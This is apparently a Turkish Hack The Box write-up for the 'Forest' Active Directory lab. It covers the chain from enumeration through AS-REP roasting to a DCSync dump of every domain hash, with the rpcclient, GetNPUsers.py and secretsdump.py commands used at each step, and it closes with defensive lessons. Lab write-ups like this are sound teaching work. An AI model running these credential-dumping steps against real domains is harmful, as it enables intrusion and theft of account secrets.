## Makine Bilgisi

- **İsim:** Forest
- **Zorluk:** Easy
- **İşletim Sistemi:** Windows (Active Directory)

## Enumeration

```bash
nmap -sC -sV -oA forest 10.10.10.161
```

Açık portlar arasında LDAP (389), Kerberos (88) ve SMB (445) dikkat çekiyor — klasik bir Domain Controller imzası.

Null session ile kullanıcı listesi çekilebiliyor:

```bash
rpcclient -U "" -N 10.10.10.161
> enumdomusers
```

## AS-REP Roasting

Enumerate edilen kullanıcılar arasında Kerberos pre-authentication'ı kapalı bir hesap bulunuyor (`svc-alfresco`):

```bash
GetNPUsers.py FOREST.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
```

Elde edilen hash `hashcat` ile kırılıyor ve `svc-alfresco` kimlik bilgilerine erişim sağlanıyor.

## Yetki Yükseltme

BloodHound ile çekilen veri, `svc-alfresco` hesabının `Exchange Windows Permissions` grubu üzerinden `WriteDACL` yetkisine sahip olduğunu gösteriyor. Bu, domain nesnesine `DCSync` hakkı eklemeyi mümkün kılıyor:

```bash
secretsdump.py FOREST.LOCAL/svc-alfresco:'password'@10.10.10.161
```

Bu adımın ardından `krbtgt` hash'i dahil tüm domain hash'leri dökülüyor — tam **Domain Admin** erişimi.

## Öğrenilenler

- Null session enumeration hâlâ ciddi bilgi sızıntısına yol açabiliyor.
- AS-REP Roasting'e karşı tüm hesaplarda Kerberos pre-auth zorunlu tutulmalı.
- Grup üyelikleri ve nested permission'lar (Exchange gibi) dikkatli denetlenmeli — BloodHound bu tür zincirleri hızlıca ortaya çıkarıyor.
